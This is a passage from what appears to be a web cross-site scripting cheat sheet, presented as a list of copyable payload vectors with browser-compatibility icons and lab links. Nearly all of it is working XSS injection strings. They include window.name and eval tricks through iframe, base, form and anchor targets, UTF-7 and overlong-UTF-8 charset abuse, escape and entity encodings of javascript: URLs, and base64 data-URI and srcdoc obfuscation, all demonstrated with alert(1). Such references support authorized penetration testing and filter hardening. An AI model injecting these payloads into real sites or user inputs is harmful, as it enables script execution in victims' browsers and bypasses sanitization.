src=\"https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\"></iframe>`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20name%3D%22alert%281%29%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fcontext%3Djs_string_single%26x%3D%2527%3Beval%28name%29%2F%2F%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#set-windowname-via-name-attribute-in-a-iframe-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSet window.name via target attribute in a <base\\> tag\n\n[`<base target=\"alert(1)\"><a href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\">XSS via target in base tag</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbase%20target%3D%22alert%281%29%22%3E%3Ca%20href%3D%22http%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fxss%2Fxss.php%3Fcontext%3Djs_string_single%26x%3D%2527%3Beval%28name%29%2F%2F%22%3EXSS%20via%20target%20in%20base%20tag%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#set-windowname-via-target-attribute-in-a-base-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSet window.name via target attribute in a <a\\> tag\n\n[`<a target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\">XSS via target in a tag</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20target%3D%22alert%281%29%22%20href%3D%22http%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fxss%2Fxss.php%3Fcontext%3Djs_string_single%26x%3D%2527%3Beval%28name%29%2F%2F%22%3EXSS%20via%20target%20in%20a%20tag%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#set-windowname-via-target-attribute-in-a-a-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSet window.name via usemap attribute in a <img\\> tag\n\n[`<img src=\"validimage.png\" width=\"10\" height=\"10\" usemap=\"#xss\"><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"alert(1)\" href=\"http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\"></map>`](https://portswigger-labs.net/xss/xss.php?x=%3Cimg%20src%3D%22validimage.png%22%20width%3D%2210%22%20height%3D%2210%22%20usemap%3D%22%23xss%22%3E%3Cmap%20name%3D%22xss%22%3E%3Carea%20shape%3D%22rect%22%20coords%3D%220%2C0%2C82%2C126%22%20target%3D%22alert%281%29%22%20href%3D%22http%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fxss%2Fxss.php%3Fcontext%3Djs_string_single%26x%3D%2527%3Beval%28name%29%2F%2F%22%3E%3C%2Fmap%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#set-windowname-via-usemap-attribute-in-a-img-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSet window.name via target attribute in a <form\\> tag\n\n[`<form action=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" target=\"alert(1)\"><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input type=\"submit\" value=\"XSS via target in a form\"></form>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%20action%3D%22http%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fxss%2Fxss.php%22%20target%3D%22alert%281%29%22%3E%3Cinput%20type%3Dhidden%20name%3Dx%20value%3D%22%27%3Beval%28name%29%2F%2F%22%3E%3Cinput%20type%3Dhidden%20name%3Dcontext%20value%3Djs_string_single%3E%3Cinput%20type%3D%22submit%22%20value%3D%22XSS%20via%20target%20in%20a%20form%22%3E%3C%2Fform%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#set-windowname-via-target-attribute-in-a-form-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSet window.name via formtarget attribute in a <input\\> tag type submit\n\n[`<form><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input type=\"submit\" formaction=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type submit\"></form>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cinput%20type%3Dhidden%20name%3Dx%20value%3D%22%27%3Beval%28name%29%2F%2F%22%3E%3Cinput%20type%3Dhidden%20name%3Dcontext%20value%3Djs_string_single%3E%3Cinput%20type%3D%22submit%22%20formaction%3D%22http%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fxss%2Fxss.php%22%20formtarget%3D%22alert%281%29%22%20value%3D%22XSS%20via%20formtarget%20in%20input%20type%20submit%22%3E%3C%2Fform%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#set-windowname-via-formtarget-attribute-in-a-input-tag-type-submit)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSet window.name via formtarget attribute in a <input\\> tag type image\n\n[`<form><input type=hidden name=x value=\"';eval(name)//\"><input type=hidden name=context value=js_string_single><input name=1 type=\"image\" src=\"validimage.png\" formaction=\"http://subdomain1.portswigger-labs.net/xss/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type image\"></form>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cinput%20type%3Dhidden%20name%3Dx%20value%3D%22%27%3Beval%28name%29%2F%2F%22%3E%3Cinput%20type%3Dhidden%20name%3Dcontext%20value%3Djs_string_single%3E%3Cinput%20name%3D1%20type%3D%22image%22%20src%3D%22validimage.png%22%20formaction%3D%22http%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fxss%2Fxss.php%22%20formtarget%3D%22alert%281%29%22%20value%3D%22XSS%20via%20formtarget%20in%20input%20type%20image%22%3E%3C%2Fform%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#set-windowname-via-formtarget-attribute-in-a-input-tag-type-image)\n\nSpecial tags\n------------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nRedirect to a different domain\n\n[`<meta http-equiv=\"refresh\" content=\"0; url=//portswigger-labs.net\">`](https://portswigger-labs.net/xss/xss.php?x=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3B%20url%3D%2F%2Fportswigger-labs.net%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#redirect-to-a-different-domain)\n\nMeta charset attribute UTF-7\n\n[`<meta charset=\"UTF-7\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-`](https://portswigger-labs.net/xss/xss.php?x=%3Cmeta%20charset%3D%22UTF-7%22%20%2F%3E%20%2BADw-script%2BAD4-alert%281%29%2BADw-%2Fscript%2BAD4-&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#meta-charset-attribute-utf7)\n\nMeta charset UTF-7\n\n[`<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-7\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-`](https://portswigger-labs.net/xss/xss.php?x=%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text%2Fhtml%3B%20charset%3DUTF-7%22%20%2F%3E%20%2BADw-script%2BAD4-alert%281%29%2BADw-%2Fscript%2BAD4-&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#meta-charset-utf7)\n\nUTF-7 BOM characters (Has to be at the start of the document) 1\n\n[``` +/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4- ```](https://portswigger-labs.net/xss/xss.php?x=%2B%2Fv8%0A%2BADw-script%2BAD4-alert%281%29%2BADw-%2Fscript%2BAD4-&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#utf7-bom-characters-has-to-be-at-the-start-of-the-document-1)\n\nUTF-7 BOM characters (Has to be at the start of the document) 2\n\n[``` +/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4- ```](https://portswigger-labs.net/xss/xss.php?x=%2B%2Fv9%0A%2BADw-script%2BAD4-alert%281%29%2BADw-%2Fscript%2BAD4-&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#utf7-bom-characters-has-to-be-at-the-start-of-the-document-2)\n\nUTF-7 BOM characters (Has to be at the start of the document) 3\n\n[``` +/v+ +ADw-script+AD4-alert(1)+ADw-/script+AD4- ```](https://portswigger-labs.net/xss/xss.php?x=%2B%2Fv%2B%0A%2BADw-script%2BAD4-alert%281%29%2BADw-%2Fscript%2BAD4-&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#utf7-bom-characters-has-to-be-at-the-start-of-the-document-3)\n\nUTF-7 BOM characters (Has to be at the start of the document) 4\n\n[``` +/v/ +ADw-script+AD4-alert(1)+ADw-/script+AD4- ```](https://portswigger-labs.net/xss/xss.php?x=%2B%2Fv%2F%0A%2BADw-script%2BAD4-alert%281%29%2BADw-%2Fscript%2BAD4-&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#utf7-bom-characters-has-to-be-at-the-start-of-the-document-4)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUpgrade insecure requests\n\n[`<meta http-equiv=\"Content-Security-Policy\" content=\"upgrade-insecure-requests\">`](https://portswigger-labs.net/xss/xss.php?x=%3Cmeta%20http-equiv%3D%22Content-Security-Policy%22%20content%3D%22upgrade-insecure-requests%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#upgrade-insecure-requests)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nDisable JavaScript via iframe sandbox\n\n[`<iframe sandbox src=\"//portswigger-labs.net\"></iframe>`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20sandbox%20src%3D%22%2F%2Fportswigger-labs.net%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#disable-javascript-via-iframe-sandbox)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nDisable referer\n\n[`<meta name=\"referrer\" content=\"no-referrer\">`](https://portswigger-labs.net/xss/xss.php?x=%3Cmeta%20name%3D%22referrer%22%20content%3D%22no-referrer%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#disable-referer)\n\nEncoding\n--------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nOverlong UTF-8\n\n[``` %C0%BCscript>alert(1)</script> %E0%80%BCscript>alert(1)</script> %F0%80%80%BCscript>alert(1)</script> %F8%80%80%80%BCscript>alert(1)</script> %FC%80%80%80%80%BCscript>alert(1)</script> ```](https://portswigger-labs.net/xss/xss.php?x=%25C0%25BCscript%3Ealert%281%29%3C%2Fscript%3E%0A%25E0%2580%25BCscript%3Ealert%281%29%3C%2Fscript%3E%0A%25F0%2580%2580%25BCscript%3Ealert%281%29%3C%2Fscript%3E%0A%25F8%2580%2580%2580%25BCscript%3Ealert%281%29%3C%2Fscript%3E%0A%25FC%2580%2580%2580%2580%25BCscript%3Ealert%281%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#overlong-utf8)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUnicode escapes\n\n[`<script>\\u0061lert(1)</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%5Cu0061lert%281%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#unicode-escapes)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUnicode escapes ES6 style\n\n[`<script>\\u{61}lert(1)</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%5Cu%7B61%7Dlert%281%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#unicode-escapes-es6-style)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUnicode escapes ES6 style zero padded\n\n[`<script>\\u{0000000061}lert(1)</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%5Cu%7B0000000061%7Dlert%281%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#unicode-escapes-es6-style-zero-padded)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nHex encoding JavaScript escapes\n\n[`<script>eval('\\x61lert(1)')</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Eeval%28%27%5Cx61lert%281%29%27%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#hex-encoding-javascript-escapes)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nOctal encoding\n\n[``` <script>eval('\\141lert(1)')</script> <script>eval('alert(\\061)')</script> <script>eval('alert(\\61)')</script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Eeval%28%27%5C141lert%281%29%27%29%3C%2Fscript%3E%0A%3Cscript%3Eeval%28%27alert%28%5C061%29%27%29%3C%2Fscript%3E%0A%3Cscript%3Eeval%28%27alert%28%5C61%29%27%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#octal-encoding)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nDecimal encoding with optional semi-colon\n\n[`<a href=\"&#106;avascript:alert(1)\">XSS</a><a href=\"&#106avascript:alert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22%26%23106%3Bavascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E%3Ca%20href%3D%22%26%23106avascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#decimal-encoding-with-optional-semicolon)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSVG script with HTML encoding\n\n[``` <svg><script>&#97;lert(1)</script></svg> <svg><script>&#x61;lert(1)</script></svg> <svg><script>alert&NewLine;(1)</script></svg> <svg><script>x=\"&quot;,alert(1)//\";</script></svg> ```](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cscript%3E%26%2397%3Blert%281%29%3C%2Fscript%3E%3C%2Fsvg%3E%0A%3Csvg%3E%3Cscript%3E%26%23x61%3Blert%281%29%3C%2Fscript%3E%3C%2Fsvg%3E%0A%3Csvg%3E%3Cscript%3Ealert%26NewLine%3B%281%29%3C%2Fscript%3E%3C%2Fsvg%3E%0A%3Csvg%3E%3Cscript%3Ex%3D%22%26quot%3B%2Calert%281%29%2F%2F%22%3B%3C%2Fscript%3E%3C%2Fsvg%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg-script-with-html-encoding)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nDecimal encoding with padded zeros\n\n[`<a href=\"&#0000106avascript:alert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22%26%230000106avascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#decimal-encoding-with-padded-zeros)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nHex encoding entities\n\n[`<a href=\"&#x6a;avascript:alert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22%26%23x6a%3Bavascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#hex-encoding-entities)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nHex encoding without semi-colon provided next character is not a-f0-9\n\n[``` <a href=\"j&#x61vascript:alert(1)\">XSS</a> <a href=\"&#x6a avascript:alert(1)\">XSS</a> <a href=\"&#x6a avascript:alert(1)\">XSS</a> ```](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22j%26%23x61vascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%22%26%23x6a%0Aavascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%22%26%23x6a%20avascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#hex-encoding-without-semicolon-provided-next-character-is-not-af09)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nHex encoding with padded zeros\n\n[`<a href=\"&#x0000006a;avascript:alert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22%26%23x0000006a%3Bavascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#hex-encoding-with-padded-zeros)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nHex encoding is not case sensitive\n\n[`<a href=\"&#X6A;avascript:alert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22%26%23X6A%3Bavascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#hex-encoding-is-not-case-sensitive)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nHTML entities\n\n[``` <a href=\"javascript&colon;alert(1)\">XSS</a> <a href=\"java&Tab;script:alert(1)\">XSS</a> <a href=\"java&NewLine;script:alert(1)\">XSS</a> <a href=\"javascript&colon;alert&lpar;1&rpar;\">XSS</a> ```](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22javascript%26colon%3Balert%281%29%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%22java%26Tab%3Bscript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%22java%26NewLine%3Bscript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%22javascript%26colon%3Balert%26lpar%3B1%26rpar%3B%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#html-entities)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nURL encoding\n\n[`<a href=\"javascript:x='%27-alert(1)-%27';\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22javascript%3Ax%3D%27%2527-alert%281%29-%2527%27%3B%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#url-encoding)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nHTML entities and URL encoding\n\n[`<a href=\"javascript:x='&percnt;27-alert(1)-%27';\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22javascript%3Ax%3D%27%26percnt%3B27-alert%281%29-%2527%27%3B%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#html-entities-and-url-encoding)\n\nObfuscation\n-----------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nData protocol inside script src with base64\n\n[`<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%20src%3Ddata%3Atext%2Fjavascript%3Bbase64%2CYWxlcnQoMSk%3D%3E%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#data-protocol-inside-script-src-with-base64)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nData protocol inside script src with base64 and HTML entities\n\n[`<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%20src%3Ddata%3Atext%2Fjavascript%3Bbase64%2C%26%23x59%3B%26%23x57%3B%26%23x78%3B%26%23x6c%3B%26%23x63%3B%26%23x6e%3B%26%23x51%3B%26%23x6f%3B%26%23x4d%3B%26%23x53%3B%26%23x6b%3B%26%23x3d%3B%3E%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#data-protocol-inside-script-src-with-base64-and-html-entities)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nData protocol inside script src with base64 and URL encoding\n\n[`<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%20src%3Ddata%3Atext%2Fjavascript%3Bbase64%2C%2559%2557%2578%256c%2563%256e%2551%256f%254d%2553%256b%253d%3E%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#data-protocol-inside-script-src-with-base64-and-url-encoding)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nIframe srcdoc HTML encoded\n\n[`<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20srcdoc%3D%26lt%3Bscript%26gt%3Balert%26lpar%3B1%26rpar%3B%26lt%3B%26sol%3Bscript%26gt%3B%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#iframe-srcdoc-html-encoded)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in 